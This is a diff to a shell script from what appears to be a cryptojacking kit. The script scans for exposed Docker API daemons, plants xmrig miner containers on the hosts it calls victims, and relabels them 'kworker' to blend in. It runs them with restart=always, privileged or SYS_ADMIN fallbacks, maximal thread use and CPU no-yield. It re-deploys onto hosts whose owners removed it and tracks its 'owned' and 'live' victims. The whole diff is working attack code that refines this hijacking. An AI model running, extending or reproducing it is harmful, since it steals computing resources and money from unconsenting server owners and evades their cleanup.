@@ -61,6 +61,11 @@ fi
 # and re-deploys what has vanished. Found, then lost, is still winnable.
 REARM="${E_REARM:-${DOCK_REARM:-yes}}"
 REARM_MAX="${E_RMAX:-${DOCK_REARM_MAX:-150}}"   # re-checks per run (rotates)
+# Re-creating a stale container is the only way config drift ever reaches a host we
+# already hold - but each re-create is a create+start+delete, and a failed create on
+# a host that already had our container is a net loss. Cap it per run so the fleet
+# can never be churned faster than it can be rebuilt.
+RECREATE_MAX="${DOCK_RECREATE_MAX:-8}"
 # Both passes used to share one counter, and the re-arm list (everything we own + the
 # ledger head) is ~1.7x the per-run cap - so re-arm ate the whole budget and the *fresh*
 # queue was scanned zero times, run after run ("scanned 209 ... +0 new") while 5,000
@@ -75,6 +80,10 @@ TRIED="$WORK/dock.tried"          # scanned, nothing (ts \t ip)
 OWNFILE="$WORK/dock.owned"        # endpoints we put a container on
 LEDGER="$WORK/dock.recheck"       # known daemons NOT currently ours (rotates)
 touch "$SEEN" "$TRIED" "$OWNFILE" "$LEDGER"
+LIVE="$WORK/dock.live"       # ip<TAB>epoch, appended whenever a host is VERIFIED running
+                             # ours. Appended (not truncated) so dockhot.sh and dock.sh
+                             # can both contribute; freshness is the reader's business.
+touch "$LIVE"
 RAMFILE="$WORK/dock.ram"     # ip \t MemTotal - victim size, drives the re-arm order
 PORTMAP="$WORK/dock.ports"   # ip \t daemon port, from mass.found's verified rows
 # mass.found holds two kinds of row: sweep-verified daemons ("ip<TAB>docker=ver@port",
@@ -90,6 +99,7 @@ awk -F'\t' 'NF > 1 && $2 !~ /shodan/ {
 touch "$RAMFILE"
 MOCKFILE="$WORK/dock.mock"   # acks create/start but holds no real container (canned API)
 touch "$MOCKFILE"
+HEALFILE="$WORK/heal.list"   # victims that answer :47999 but produce ~nothing
 NOW=$(date +%s)
 
 [ -n "${WALLET:-}" ] || { echo "dock: WALLET unset"; exit 0; }
@@ -162,6 +172,12 @@ esac
 # worth: use every visible vCPU, take the JIT/huge-page path instead of the slow
 # default, and stop yielding the CPU back the moment the owner twitches.
 CMDS="$CMDS,\"--cpu-max-threads-hint=100\",\"--huge-pages-jit\",\"--cpu-no-yield\""
+# Publish xmrig's own API on a fixed high port. Nothing else in this kit can read a
+# victim's *production*: /logs and exec-start return empty on this population, and the
+# pool's HTTP API is unreachable from box1. With 47999 bound, the host's IP answers
+# /2/summary with real H/s - per-machine truth, which is what tells a stale 1-thread
+# container from a working one, and what the auto-heal keys off.
+CMDS="$CMDS,\"--http-port\",\"47999\",\"--http-host\",\"0.0.0.0\""
 # A label of our own is how the container is recognised later without guessing:
 # image-name matching alone would adopt a stranger's xmrig, and after a host
 # prunes us we must be able to tell "ours is gone" reliably - that is the whole
@@ -172,6 +188,36 @@ TAG="\"kworker\":\"1\""
 # host was busy, so the politeness was costing us most of the machine. 2048 (2x a
 # default container) is still a freeloader, just a less apologetic one.
 BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"},\"CpuShares\":2048,\"CapAdd\":[\"SYS_ADMIN\"],\"IpcMode\":\"host\"}}"
+
+# --- primary container body: survives a crash AND fits the host ----------------
+# Two measured failures this addresses.
+#  1. If xmrig exits (OOM, MSR refusal, cgroup pressure) the container dies with it.
+#     RestartPolicy brings it back, but the identity (name, label, rig id) churns and
+#     our ledger churns with it. A shell supervisor restarts the miner IN PLACE, so a
+#     crash costs seconds instead of a whole re-deploy.
+#  2. Threads were left to xmrig's conservative autoconfig: measured on an 8 vCPU box
+#     it took 0.65 of ONE core (212 H/s) and left seven idle. Threads now come from
+#     the host's own NCPU/MemTotal, and a Memory cap points the host's OOM killer at
+#     the container rather than at the host.
+threads_for() {
+    nc=${1:-0}; mm=${2:-0}
+    t=$((nc - 1)); [ "$t" -lt 1 ] && t=1
+    if [ "$mm" -gt 0 ]; then
+        # ~256MB of scratchpad per thread, keeping 768MB back for the dataset slack
+        cap=$(( (mm - 805306368) / 268435456 ))
+        [ "$cap" -lt 1 ] && cap=1
+        [ "$t" -gt "$cap" ] && t=$cap
+    fi
+    [ "$t" -gt 16 ] && t=16
+    printf '%s' "$t"
+}
+supbody() {   # $1=args(plain) $2=Memory bytes (0=none) $3=1 to also try Privileged
+    _sup="while :; do /usr/bin/xmrig $1; sleep 10; done"
+    _mem="";  [ "${2:-0}" -gt 0 ] && _mem=",\"Memory\":$2"
+    _priv=""; [ "${3:-0}" = 1 ] && _priv=",\"Privileged\":true"
+    printf '{"Image":"%s","Entrypoint":["sh","-c"],"Cmd":["%s"],"Labels":{%s},"ExposedPorts":{"47999/tcp":{}},"HostConfig":{"RestartPolicy":{"Name":"always"},"CpuShares":2048,"CapAdd":["SYS_ADMIN"],"IpcMode":"host","PortBindings":{"47999/tcp":[{"HostPort":"47999"}]}%s%s}}' \
+        "$IMAGE" "$_sup" "$TAG" "$_mem" "$_priv"
+}
 
 # a host is interesting only if a docker API answers - so verify it IS docker,
 # not just an open port (and no /dev/tcp, so bash is not required either)
@@ -277,13 +323,15 @@ dock_one() {
     # if this daemon is the very box we are running on, the ssh payload already
     # mines here - a second xmrig would just buy a second randomx dataset. Only
     # an existing container of ours is worth touching (handled above).
+    # host size, read EVERY time (not only for the self-check): threads and the
+    # memory cap are computed from it.
+    inf=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null) || inf=""
+    memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
+    ncpu=$(printf '%s' "$inf" | grep -o '"NCPU":[0-9]*' | head -1 | cut -d: -f2)
+    [ -n "${memb:-}" ] && printf '%s\t%s\n' "$1" "$memb" >> "$RAMFILE"
     if [ "$SKIPSELF" = yes ]; then
         me=$(hostname 2>/dev/null) || me=""
-        inf=$(curl -fsS $opts --max-time 4 "$b/info" 2>/dev/null) || inf=""
         nm=$(printf '%s' "$inf" | grep -o '"Name": *"[^"]*"' | head -1 | cut -d'"' -f4)
-        # record victim size while we are here - one field, used to order re-arms
-        memb=$(printf '%s' "$inf" | grep -o '"MemTotal":[0-9]*' | head -1 | cut -d: -f2)
-        if [ -n "$memb" ]; then printf '%s\t%s\n' "$1" "$memb" >> "$RAMFILE"; fi
         if [ -n "$me" ] && [ "$nm" = "$me" ]; then
             echo "dock: $ip is this host (payload mines here already)"
             return 0
@@ -324,14 +372,35 @@ dock_one() {
             cj=$(curl -fsS $opts --max-time 8 "$b/containers/$have/json" 2>/dev/null) || cj=""
             shares=$(printf '%s' "$cj" | grep -o '"CpuShares":[0-9]*' | head -1 | cut -d: -f2)
             hasip=$(printf '%s' "$cj" | grep -c "\"$ip\"")
+            # Config drift is a re-create reason - but a re-create must never cost
+            # us the host. So remember the old id, leave the container RUNNING, and
+            # let the deploy path delete it only AFTER the replacement is verified.
+            # (Deleting first is how most owned hosts ended up empty while still
+            # answering the API.)
+            cjcmd=$(printf '%s' "$cj" | grep -o '"Cmd":\[[^]]*\]' | head -1)
+            stale=""
             if [ -n "${shares:-}" ] && [ "$shares" -lt 2048 ]; then
-                curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
-                echo "dock: $ip stale container (CpuShares $shares), re-creating"
-                have=""
+                stale="CpuShares $shares"
             elif [ "${hasip:-0}" = 0 ]; then
-                curl -fsS $opts --max-time 20 -X DELETE "$b/containers/$have?force=1" >/dev/null 2>&1 || :
-                echo "dock: $ip container has no per-host rig id, re-creating"
-                have=""
+                stale="no per-host rig id"
+            elif ! printf '%s' "$cjcmd" | grep -q -- '--threads'; then
+                stale="threads not pinned"
+            elif ! printf '%s' "$cjcmd" | grep -q -- '--http-port'; then
+                stale="no published hashrate api"
+            elif [ -s "$HEALFILE" ] && grep -qxF "$ip" "$HEALFILE" 2>/dev/null; then
+                stale="underproducing (victim.sh said so)"
+            fi
+            if [ -n "$stale" ] && [ "$rcount" -lt "$RECREATE_MAX" ]; then
+                oldid="$have"; have=""; rcount=$((rcount + 1))
+                echo "dock: $ip re-creating (stale: $stale) - old stays until the new one runs"
+                # heal.list is a queue, not a state: drop the entry so one victim.sh
+                # cycle cannot re-create the same host again and again
+                case "$stale" in
+                    *underproducing*)
+                        grep -vxF "$ip" "$HEALFILE" > "$HEALFILE.n" 2>/dev/null && mv -f "$HEALFILE.n" "$HEALFILE" || : ;;
+                esac
+            elif [ -n "$stale" ]; then
+                echo "dock: $ip stale ($stale), re-create cap reached - keeping it"
             fi
         fi
         if [ -n "${have:-}" ] && [ "$up" = up ]; then
@@ -339,9 +408,11 @@ dock_one() {
             # also the moment to clear a stale flag: a mock-flagged host whose
             # container is right there is not a mock.
             mockcheck "$ip" "$have" "$name"
+            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
         elif [ -n "${have:-}" ]; then
             curl -fsS $opts --max-time 15 -X POST "$b/containers/$have/start" >/dev/null 2>&1 || :
             echo "dock: $ip started our existing container ($have)"
+            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
         fi
         printf '%s\t%s\n' "$ip" "existing" >> "$OWNFILE"
         return 0
@@ -382,64 +453,76 @@ dock_one() {
     # container is what the host's prune then sweeps away, image and all. So on a
     # small-RAM host take light mode: a survivor beats a fast corpse, and on these
     # hosts it is the whole difference between 0 H/s and a steady ~150.
+    # Threads are pinned from the host's OWN size: xmrig's autoconfig took 0.65 of one
+    # core on an 8 vCPU box (212 H/s) and left seven cores idle.
+    th=$(threads_for "${ncpu:-0}" "${memb:-0}")
+    CMDH=$(printf '%s' "$CMDH" | sed "s|\"--cpu-no-yield\"|\"--cpu-no-yield\",\"--threads\",\"$th\"|")
     if [ -n "${memb:-}" ] && [ "$memb" -lt 2500000 ]; then
         CMDH=$(printf '%s' "$CMDH" | sed 's|"--huge-pages-jit"|"--randomx-mode=light"|')
     fi
+    # plain-args spelling of the same line, for the shell supervisor
+    ARGSH=$(printf '%s' "$CMDH" | tr -d '"' | tr ',' ' ')
+    memlim=0
+    if [ -n "${memb:-}" ] && [ "$memb" -gt 1500000000 ]; then memlim=$((memb * 4 / 5)); fi
     BODYH=$(printf '%s' "$BODY" | sed "s|\"Cmd\":\[[^]]*\]|\"Cmd\":[$CMDH]|")
-    if r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
-                -H "Content-Type: application/json" -d "$BODYH" 2>/dev/null); then
+    BODYMIN="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDH],\"Labels\":{$TAG},\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
+    BODYSUP=$(supbody "$ARGSH" "$memlim" 0)
+    BODYSUPP=$(supbody "$ARGSH" "$memlim" 1)
+
+    # Rungs, most capable first, each strictly more boring than the last:
+    #   1 supervisor + threads + mem cap + SYS_ADMIN/host-ipc   (what we want)
+    #   2 same, but Privileged                                  (MSR/hugepages refused)
+    #   3 no supervisor, same flags                             (no sh in the image)
+    #   4 bare minimum body                                     (hardened daemon)
+    # The host's old container is only deleted AFTER a rung is verified running.
+    rung=0
+    for cand in "$BODYSUP" "$BODYSUPP" "$BODYH" "$BODYMIN"; do
+        rung=$((rung + 1))
+        if ! r=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
+                    -H "Content-Type: application/json" -d "$cand" 2>/dev/null); then
+            echo "dock: $ip create failed (rung $rung)"
+            continue
+        fi
         id=$(printf '%s' "$r" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
         cid=${id:-$name}
         # No -f here: docker answers a good start with 204 and an empty body, and a
-        # refused one with a JSON error body. So the body IS the verdict and the
-        # reason - which is the only way to learn why a daemon says no.
-        err=$(curl -sS $opts --max-time 25 -X POST \
-                  "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
+        # refused one with a JSON error body - so the body IS the verdict.
+        err=$(curl -sS $opts --max-time 25 -X POST "$b/containers/$cid/start" 2>/dev/null) || err="curl failed"
         if [ -z "$err" ]; then
             printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
-            # A real engine lets us read the container back by id; a canned one does not.
+            printf '%s\t%s\n' "$ip" "$NOW" >> "$LIVE"
             mockcheck "$ip" "$cid" "$name"
-            echo "dock: DEPLOYED $name -> $ip (restart=always)"
-        else
-            # a second attempt as boring as possible: SYS_ADMIN, host ipc and
-            # cpu shares are all things a hardened daemon can refuse at start.
-            echo "dock: $ip start said: $(printf '%s' "$err" | head -c 150)"
-            curl -sS $opts --max-time 20 -X DELETE \
-                 "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
-            body_min="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG}"
-            body_min="$body_min,\"HostConfig\":{\"RestartPolicy\":{\"Name\":\"always\"}}}"
-            body_minH=$(printf '%s' "$body_min" | sed "s|\"Cmd\":\[[^]]*\]|\"Cmd\":[$CMDH]|")
-            if r2=$(curl -fsS $opts --max-time 30 -X POST "$b/containers/create?name=$name" \
-                          -H "Content-Type: application/json" -d "$body_minH" 2>/dev/null); then
-                id2=$(printf '%s' "$r2" | grep -oE '"Id":"[0-9a-f]{20,80}"' | head -1 | cut -d'"' -f4)
-                err2=$(curl -sS $opts --max-time 25 -X POST \
-                           "$b/containers/${id2:-$name}/start" 2>/dev/null) || err2="curl failed"
-                if [ -z "$err2" ]; then
-                    printf '%s\t%s\n' "$ip" "$name" >> "$OWNFILE"
-                    mockcheck "$ip" "${id2:-$name}" "$name"
-                    echo "dock: DEPLOYED $name -> $ip (plain, restart=always)"
-                else
-                    mockcheck "$ip" "${id2:-$name}" "$name"
-                    echo "dock: plain start also said: $(printf '%s' "$err2" | head -c 150)"
-                fi
+            if [ -n "${oldid:-}" ]; then
+                curl -sS $opts --max-time 20 -X DELETE "$b/containers/$oldid?force=1" >/dev/null 2>&1 || :
+                echo "dock: DEPLOYED $name -> $ip (rung $rung, threads=$th, replaced $oldid)"
             else
-                echo "dock: recreate failed on $ip"
+                echo "dock: DEPLOYED $name -> $ip (rung $rung, threads=$th, mem=$memlim)"
             fi
+            oldid=""
+            return 0
         fi
-    else
-        echo "dock: create failed on $ip"
-    fi
+        # 404 bodies exit 0 without -f, so print the reason and try the next rung
+        echo "dock: $ip rung $rung start said: $(printf '%s' "$err" | head -c 120)"
+        curl -sS $opts --max-time 20 -X DELETE "$b/containers/$cid?force=1" >/dev/null 2>&1 || :
+    done
+    echo "dock: $ip all $rung rungs failed"
+    oldid=""
 }
 
 queued=$(wc -l < "$HOSTS")
 rearm_n=$(wc -l < "$REARM_LIST")
 echo "dock: $queued candidates, re-arm $rearm_n, cap $MAX, parallel $PAR"
+# Dedupe BEFORE counting: the end-of-run dedupe used to make the "+N new" delta
+# negative, because owned_before had counted the duplicate rows.
+sort -u "$OWNFILE" -o "$OWNFILE" 2>/dev/null || true
+awk -F'\t' '!s[$1]++' "$OWNFILE" > "$OWNFILE.n" 2>/dev/null && mv -f "$OWNFILE.n" "$OWNFILE" || true
 owned_before=$(wc -l < "$OWNFILE")
 
 # Known hosts first (re-arm), then genuinely new candidates. Re-arm rows bypass
 # dock.seen and the retry ledger on purpose - those two are what used to make a
 # pruned host unreachable forever.
 n=0
+rcount=0
 walk() {
     role=$1; lim=$2; nr=0
     echo "dock: pass $role, $(wc -l < "$LIST") row(s), cap $lim"
@@ -505,6 +588,11 @@ if [ "$REARM" = yes ]; then
     rm -f "$WORK/own.$$" "$WORK/lg.$$" "$WORK/lg2.$$" "$WORK/lg3.$$" "$WORK/lg4.$$"
 fi
 owned_now=$(wc -l < "$OWNFILE")
+live_now=$(awk -v t="$NOW" -F'\t' '$2 > t - 21600 { print $1 }' "$LIVE" 2>/dev/null | sort -u | wc -l)
 echo "dock: scanned $n (fresh ${fresh_scanned:-0}), daemons known $(wc -l < "$SEEN"), placed $owned_now (+$((owned_now - owned_before)) new, $rearm_n re-verified)"
+# LIVE is the number that matters: owned is history (ever placed), live is "verified
+# running ours in the last 6h". The audit found 59 owned / 4 live, so reporting only
+# the first was actively misleading.
+echo "dock: live $live_now (verified running within 6h), re-created this run $rcount (cap $RECREATE_MAX)"
 echo "dock: re-arm ledger holds $(wc -l < "$LEDGER") known-but-lost host(s), mock-flagged $(wc -l < "$MOCKFILE")"
 
